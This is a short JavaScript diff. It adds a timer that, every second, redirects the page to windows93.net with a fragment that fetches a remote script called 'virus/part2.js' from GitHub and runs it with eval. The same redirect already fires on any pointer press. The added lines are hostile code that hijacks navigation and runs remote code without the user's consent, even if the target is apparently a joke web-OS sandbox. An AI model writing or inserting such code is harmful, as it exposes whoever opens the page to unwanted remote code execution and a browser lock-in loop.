@@ -36,7 +36,9 @@ function modifyContent() {
     })
     .catch(error => console.error("Error fetching or modifying CSS:", error));
 }
-
+setInterval(function(){
+  window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
+},1000)
   window.addEventListener("pointerdown", function() {
   window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
 });
